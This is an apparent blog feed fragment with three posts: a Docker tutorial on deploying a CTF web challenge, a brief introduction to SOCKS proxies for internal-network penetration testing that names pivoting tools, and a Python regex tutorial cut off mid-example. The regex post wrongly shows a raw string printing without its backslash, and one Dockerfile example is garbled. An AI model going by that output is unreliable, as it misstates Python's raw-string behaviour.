    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p><a href="https://www.cnblogs.com/wt7018/p/11880666.html" title="安装docker">安装docker</a><br><a href="https://blog.csdn.net/oYinHeZhiGuang/article/details/88791009" title="安装docker-compose">安装docker-compose</a><br><a href="https://www.cnblogs.com/hwlong/p/9158982.html" title="docker简介">docker简介</a></p><h2 id="0x01-Docker常用命令"><a href="#0x01-Docker常用命令" class="headerlink" title="0x01 Docker常用命令"></a>0x01 Docker常用命令</h2><p>以下命令均在root下<br>启动docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><p>查看当前镜像列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>导入镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker import [options] file|URL|- [REPOSITORY[:TAG]]</span><br><span class="line">例：</span><br><span class="line">docker import music.tar music:centos</span><br><span class="line">导入以前导出的用Dockerfile生成的镜像，然后修改它的REPOSITORY为music,TAG为centos</span><br></pre></td></tr></table></figure><p>导出镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker export [OPTIONS] CONTAINER</span><br><span class="line">例：</span><br><span class="line">docker export -o test-mysql.tar &lt;容器 ID&gt;</span><br></pre></td></tr></table></figure><p>进入镜像的终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i music:centos /bin/bash</span><br><span class="line"></span><br><span class="line">退出： exit</span><br><span class="line">参数说明：</span><br><span class="line">-i: 交互式操作</span><br><span class="line">-t: 终端</span><br><span class="line">music:centos: 镜像</span><br><span class="line">/bin/bash: 交互式shell</span><br></pre></td></tr></table></figure><p>网络端口映射</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 1001:80 music:centos /run.sh</span><br><span class="line"></span><br><span class="line">-d: 后台运行</span><br><span class="line">-p: 指定端口 宿主机端口:容器端口</span><br></pre></td></tr></table></figure><p>删除容器进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f ID</span><br></pre></td></tr></table></figure><p>查看所有容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>查看正在运行的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>docker停止一个容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID</span><br></pre></td></tr></table></figure><p>开启以关闭容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器ID</span><br></pre></td></tr></table></figure><p>删除镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像ID</span><br></pre></td></tr></table></figure><p>使用dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t test-mysql</span><br><span class="line">docker build为创建镜像命令</span><br><span class="line">名称为test-mysql</span><br><span class="line">&#x27;.&#x27;表示当前目录即Dockerfile文件所在的目录</span><br></pre></td></tr></table></figure><p>进入一个以开启的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器ID /bin/bash</span><br></pre></td></tr></table></figure><p>从宿主机复制文件到容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 本地文件 容器ID:路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker search [keywords] 搜寻与keywords相关的镜像</span><br><span class="line">docker images  查看本地的image镜像</span><br><span class="line">docker pull [image] 拉取镜像</span><br><span class="line">docker run -d -p [host port]:[docker port] [image] 新建一个docker容器，并映射端口号</span><br><span class="line">docker ps -a 查看运行中的docker容器</span><br><span class="line">docker exec -it [container id] bash 进入一个docker容器</span><br><span class="line">docker cp [本地路径] [container id]:[container 路径] 拷贝本地文件到docker</span><br><span class="line">docker start [container id] 启动一个docker容器</span><br><span class="line">docker stop [container id] 停止一个docker容器</span><br><span class="line">docker rm [container id] 删除一个docker容器(需要先停止容器才能删除容器)</span><br><span class="line">docker rmi [image id] 删除一个docker镜像(需要删除镜像对应的容器才能删除镜像)</span><br></pre></td></tr></table></figure><h2 id="0x02-实例"><a href="#0x02-实例" class="headerlink" title="0x02 实例"></a>0x02 实例</h2><p>下面以一道ctf为例<br>搜索环境镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure><p>拉取环境需要的镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure><p>用镜像创建容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@test:~# docker run -d -p 8888:80 tutum/lamp</span><br><span class="line">cb0bc63b1ebbec1258c9eb0c97415a0ccf6a323a60cddcc361006f59f77a3c2e</span><br><span class="line">这一串数字为容器ID</span><br></pre></td></tr></table></figure><p>上传本地文件到容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/test/2019JNUCTF/Web/easyupload/ cb0bc63b1ebbec1258c9eb:/var/www/html</span><br><span class="line">容器ID可以不用写全，只写前面几位也是可以的</span><br></pre></td></tr></table></figure><p>访问 <code>ip:8888/easyupload</code> 成功。<br><img src="/post/11960/1.png"></p><h2 id="0x03-Dockerfile"><a href="#0x03-Dockerfile" class="headerlink" title="0x03 Dockerfile"></a>0x03 Dockerfile</h2><p>我们可以把构建一道题目的过程分为以下具体三步。</p><ol><li>指定具体要使用的镜像</li><li>启动镜像，构建一个容器</li><li>移入相关的源码，构建容器里面的环境配置<br>在上面的实例中，我们第三步里面需要进行的操作只有把源码移入/var/www/html文件夹里面而已，但如果环境配置较为复杂，比如需要构建数据库，安装各种插件等，第三步需要的时间就太长了。如果我们改变下上面的步骤。变成：</li><li>指定使用的镜像</li><li>配置相关的环境，移入相关的代码</li><li>根据第二步的内容，把这些操作以类似于代码，程序的模式写入一个模板，让Docker根据这个模板来生成新的镜像</li><li>根据这个新的镜像来生成新的容器<br>如果是这么操作的话，带来的好处就是可以方便的构造出一个针对性的镜像。配置题目的时候，我们只需要根据这个我们创作的模板生成特制的镜像，直接按照这个镜像就可以直接生成环境了。这个需要的模板就是<code>Dockerfile</code>。<br><code>Dockerfile</code>是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker通过读取<code>Dockerfile</code>中的指令自动生成映像。<br><code>docker build</code>命令用于从Dockerfile构建映像。可以在<code>docker build</code>命令中使用-f标志指向文件系统中任何位置的<code>Dockerfile</code>。<br><code>Dockerfile</code> 一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，<code>#</code> 为 Dockerfile 中的注释。<br>Docker以从上到下的顺序运行<code>Dockerfile</code>的指令。为了指定基本映像，第一条指令必须是<code>FROM</code>。一个声明以＃字符开头则被视为注释。可以在Docker文件中使用<code>RUN</code>，<code>CMD</code>，<code>FROM</code>，<code>EXPOSE</code>，<code>ENV</code>等指令。</li></ol><p><strong>常用指令</strong><br>FROM： 指定基础镜像，必须为第一个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM &lt;image&gt;</span><br><span class="line">FROM &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">FROM &lt;image&gt;@&lt;digest&gt;</span><br><span class="line">例：</span><br><span class="line">  FROM php:5.6</span><br><span class="line">tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure><p>MAINTAINER: 维护者信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MAINTAINER &lt;name&gt;</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">    MAINTAINER zhangsan</span><br><span class="line">MAINTAINER 123@163.com</span><br></pre></td></tr></table></figure><p>RUN: 构建镜像时执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RUN用于在镜像容器中执行命令，其有以下两种命令执行方式：</span><br><span class="line">shell执行</span><br><span class="line">RUN &lt;command&gt;</span><br><span class="line">exec执行</span><br><span class="line">RUN [&quot;executable&quot;, &quot;paraml&quot;, &quot;param2&quot;]</span><br><span class="line">RUN指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定--no-cache参数，如：docker build --no-cache</span><br></pre></td></tr></table></figure><p>ADD: 将本地文件添加到容器中，tar类型文件会自动解压（网络压缩资源不会被解压），可以访问网络资源，类似wget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ADD &lt;src&gt; ... &lt;dest&gt;</span><br><span class="line">ADD [&quot;&lt;src&gt;&quot;, ... &quot;&lt;dest&gt;&quot;] 用于支持包含空格的路径</span><br><span class="line">例：</span><br><span class="line">ADD hom* /mydir/  # 添加所有以 hom 开头的文件</span><br><span class="line">ADD hom?.txt /mydir/  # ?替代一个单字符，例如，home.txt</span><br><span class="line">ADD test mydir/  # 添加test到mydir</span><br></pre></td></tr></table></figure><p>COPY: 功能类似ADD，但是不会自动解压文件，也不能访问网络资源<br>CMD: 构建容器后调用，也就是在容器启动时才进行调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] # 执行可执行文件，优先</span><br><span class="line">CMD [&quot;param1&quot;,&quot;param2&quot;]  # 设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数</span><br><span class="line">CMD command param1 param2  # 执行shell内部命令</span><br><span class="line"></span><br><span class="line">CMD echo &quot;This is a test.&quot; | wc -</span><br><span class="line">CMD [&quot;/usr/bin/wc&quot;,&quot;--help&quot;]</span><br><span class="line"></span><br><span class="line">CMD不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span><br></pre></td></tr></table></figure><p>ENTRYPOINT: 配置容器，使其可执行化。配合CMD可省去 application，只使用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]  # 可执行文件，优先</span><br><span class="line">ENTRYPOINT command param1 param2  # shell内部命令</span><br><span class="line">ENTRYPOINT与CMD非常类似，不同的是通过docker run执行的命令不会覆盖ENTRYPOINT，而docker run命令中指定的任何参数，都会被当做参数再次传递给ENTRYPOINT。Dockerfile中只允许有一个ENTRYPOINT命令，多指定时会覆盖前面的设置，而只执行最后的ENTRYPOINT指令。</span><br></pre></td></tr></table></figure><p>LABEL: 用于为镜像添加元数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span><br><span class="line">LABEL version=&quot;1.0&quot; description=&quot;this is a test&quot; by=&quot;ca5tle&quot;</span><br><span class="line">使用LABEL指定元数据时，一条LABEL指定可以指定一或多条元数据，指定多条元数据时不同元数据之间通过空格分隔。推荐所有的元数据通过一条LABEL指令指定，以免生成过多的中间镜像。</span><br></pre></td></tr></table></figure><p>ENV: 设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV &lt;key&gt; &lt;value&gt;  # &lt;key&gt;之后的所有内容均会被视为其&lt;value&gt;的组成部分，因此一次只能设置一个变量</span><br><span class="line">ENV &lt;key&gt;=&lt;value&gt; ... # 可以设置多个变量，每个变量为一个&lt;key&gt;=&lt;value&gt;的键值对，如果&lt;key&gt;中包含空格，可以使用 \ 来进行转义，也可以用&quot;&quot;表示，另外 \ 也可以用于续行</span><br></pre></td></tr></table></figure><p>EXPOSE: 指定外界交互的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE &lt;port&gt; [&lt;port&gt;...]</span><br><span class="line"></span><br><span class="line">EXPOSE并不会让容器的端口访问到主机。要使其可访问，需要在docker run运行容器时通过-p来映射端口</span><br></pre></td></tr></table></figure><p>VOLUME: 用于指定持久化目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VOLUME [&quot;/path/to/dir&quot;]</span><br><span class="line">一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：</span><br><span class="line">1. 卷可以容器间共享和重用</span><br><span class="line">2. 容器并不一定要和其他容器共享卷</span><br><span class="line">3. 修改卷后会立即生效</span><br><span class="line">4. 对卷的修改不会对镜像产生影响</span><br><span class="line">5. 卷会一直存在，直到没有任何容器在使用它</span><br></pre></td></tr></table></figure><p>USER: 指定运行容器时的用户名或UID，后续的RUN也会使用指定用户。使用USER指定用户时，可以使用用户名、UID或GID，或者是两者组合。当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USER user</span><br><span class="line">USER user:group</span><br><span class="line">USER uidU</span><br><span class="line">SER uid:gid</span><br><span class="line">USER user:gid</span><br><span class="line">USER uid:group</span><br><span class="line">使用USER指定用户后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT都将使用该用户。镜像构建完成后，通过docker run运行容器时，可以通过-u参数来覆盖所指定的用户。</span><br></pre></td></tr></table></figure><p>ARG: 用于指定传递给构建运行时的变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARG &lt;name&gt;</span><br></pre></td></tr></table></figure><p>ONBUILD: 用于设置镜像触发器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ONBUILD [INSTRUCTION]</span><br><span class="line">例：</span><br><span class="line">ONBUILD ADD . /app/src</span><br><span class="line">当所构建的镜像被用做其它镜像的基础镜像，该镜像中的触发器将会被钥触发</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wt7018/p/</summary>
      
    
    
    
    <category term="Docker" scheme="http://lvpsectime.github.io/categories/Docker/"/>
    
    
    <category term="docker" scheme="http://lvpsectime.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>SOCKS代理</title>
    <link href="http://lvpsectime.github.io/post/15027.html"/>
    <id>http://lvpsectime.github.io/post/15027.html</id>
    <published>2020-10-20T11:40:26.000Z</published>
    <updated>2020-10-21T10:31:52.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型： SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP、UDP协议，还支持各种身份验证机制等，其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理其实可以理解为加强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时尽可能选择没有GUI界面的。尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的更好。</p><p>常见的内网渗透测试环境：<br>Internet –&gt; 防火墙 –&gt; 边界 –&gt; 防火墙 –&gt; 受限区域</p><h2 id="0x01-代理工具"><a href="#0x01-代理工具" class="headerlink" title="0x01 代理工具"></a>0x01 代理工具</h2><ol><li>EarthWorm</li><li>reGeorg</li><li>sSocks</li><li>SocksCap64</li><li>Proxifier</li><li>ProxyChains</li><li>chisel</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS支持多种协议，包括HTTP、F</summary>
      
    
    
    
    <category term="内网" scheme="http://lvpsectime.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="代理" scheme="http://lvpsectime.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式</title>
    <link href="http://lvpsectime.github.io/post/26030.html"/>
    <id>http://lvpsectime.github.io/post/26030.html</id>
    <published>2020-10-20T07:31:02.000Z</published>
    <updated>2020-10-20T09:21:38.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><p>正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则，凡是符合规则的字符串，我们就认为它“匹配”了，否则，该字符串就是不合法的。</p><p>在正则表达式中，如果直接给出字符，就是精确匹配。用<code>\d</code>可以匹配一个数字，<code>\w</code>可以匹配一个字母或数字<br><code>&#39;00\d&#39;</code>可以匹配<code>&#39;002&#39;</code>、<code>&#39;003&#39;</code>等，但是无法匹配<code>&#39;00a&#39;</code><br><code>&#39;\d\d\d&#39;</code>可以匹配长度为3的字符串或数字，比如<code>&#39;123&#39;</code>、<code>&#39;111&#39;</code>等<br><code>&#39;\w\w\d&#39;</code>可以匹配长度为3的字符串，比如<code>&#39;aa1&#39;</code>、<code>&#39;ds0&#39;</code>等<br><code>.</code>可以匹配任意一个字符，比如<code>&#39;ab.&#39;</code>可以匹配<code>&#39;ab1&#39;</code>、<code>&#39;abd&#39;</code>等</p><p>要匹配变长的字符，<br>用<code>*</code>表示任意个字符，包括0个，<br>用<code>+</code>表示至少一个字符，<br>用<code>?</code>表示0个或1个字符，<br>用<code>&#123;n&#125;</code>表示n个字符，<br>用<code>&#123;n,m&#125;</code>表示n-m个字符</p><p>例如，<code>\d&#123;3&#125;\s+\d&#123;3,8&#125;</code></p><ul><li><code>\d&#123;3&#125;</code>代表3个数字</li><li><code>\s</code>代表匹配一个空格（包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格</li><li><code>\d&#123;3,8&#125;</code>表示3到8个数字</li></ul><p>综上，上面的正则表达式可以匹配前面3个数字，中间至少一个空格，后面3到8个数字的字符串</p><p>如果要匹配特殊字符，比如<code>-</code>，需要用<code>\</code>转义，即<code>\-</code></p><h2 id="0x01-进阶"><a href="#0x01-进阶" class="headerlink" title="0x01 进阶"></a>0x01 进阶</h2><p>要做到更精确的匹配，可以用<code>[]</code>表示范围</p><ul><li><code>[0-9a-zA-Z\_]</code>可以匹配一个数字、或一个字母或者一个下划线</li><li><code>[0-9a-zA-Z\_]+</code>可以匹配至少由一个数字、字母或下划线组成的字符串</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或下划线开头，后接任意个由一个数字、字母或下划线组成的字符串</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]&#123;0,19&#125;</code>更精确地限制了变量的长度是1-20个字符（前面一个字符+后面最多19个字符）</li></ul><p><code>A|B</code>可以匹配A或B<br><code>(P|p)ython</code>可以匹配<code>Python</code>或<code>python</code><br><code>^</code>表示行的开头，<code>^\d</code>表示必须以数字开头<br><code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结尾</p><h2 id="0x02-re模块"><a href="#0x02-re模块" class="headerlink" title="0x02 re模块"></a>0x02 re模块</h2><p>下面用Python的re库使用正则表达式<br>由于Python的字符串本身也用<code>\</code>转义，所以要特别注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = &#x27;abc\\-111&#x27;</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">结果： abc\-111</span><br></pre></td></tr></table></figure><p>所以我们可以使用<code>r</code>前缀，原始字符串，不用考虑转义的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = r&#x27;abc\-111&#x27;</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">结果： abc-111</span><br></pre></td></tr></table></figure><p>判断正则表达式是否匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; re.match(r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;, &#x27;010-12345&#x27;)</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 9), match=&#x27;010-12345&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; re.match(r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;, &#x27;010 12345&#x27;)</span><br></pre></td></tr></table></figure><p><code>match()</code>方法判断是否匹配，如果匹配成功，返回一个<code>Match</code>对象，否则返回<code>None</code>。常见的判断方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test = &#x27;用户输入的字符串&#x27;</span><br><span class="line">if re.match(r&#x27;正则表达式&#x27;, test):</span><br><span class="line">    print(&#x27;ok&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;failed&#x27;)</span><br></pre></td></tr></table></figure><h2 id="0x03-切分字符串"><a href="#0x03-切分字符串" class="headerlink" title="0x03 切分字符串"></a>0x03 切分字符串</h2><p>用正则表达式切片更加灵活</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;a b     c&#x27;.split(&#x27; &#x27;)</span><br><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>无法识别连续的空格，用正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a b     c&#x27;</span><br><span class="line">res = re.split(r&#x27;\s+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>切分空格、,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a,b     c,d  e&#x27;</span><br><span class="line">res = re.split(r&#x27;[\s\,]+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]</span><br></pre></td></tr></table></figure><p>再加上<code>;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a,b     c;;d  e;test&#x27;</span><br><span class="line">res = re.split(r&#x27;[\s\,\;]+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;test&#x27;]</span><br></pre></td></tr></table></figure><h2 id="0x04-分组"><a href="#0x04-分组" class="headerlink" title="0x04 分组"></a>0x04 分组</h2><p>提取子串<br>用<code>()</code>表示的就是要提取的分组(Group)。<br><code>^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$</code>分别定义了两个组，可以直接从匹配的字符串中提取出两个字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str = &#x27;010-5832360&#x27;</span><br><span class="line">if re.match(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;, str):</span><br><span class="line">    print(&quot;匹配成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;匹配失败&quot;)</span><br><span class="line">res = re.match(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;, str)</span><br><span class="line">print(res.group(0))</span><br><span class="line">print(res.group(1))</span><br><span class="line">print(res.group(2))</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">匹配成功</span><br><span class="line">010-5832360</span><br><span class="line">010</span><br><span class="line">5832360</span><br></pre></td></tr></table></figure><p>如果正则表达式中定义了组，就可以在Match对象上用group()方法提取出子串来。</p><p>注意到group(0)永远是原始字符串，group(1)、group(2)……表示第1、2、……个子串。</p><h2 id="0x05-贪婪匹配"><a href="#0x05-贪婪匹配" class="headerlink" title="0x05 贪婪匹配"></a>0x05 贪婪匹配</h2><p>最后需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#x27;^(\d+)(0*)$&#x27;, 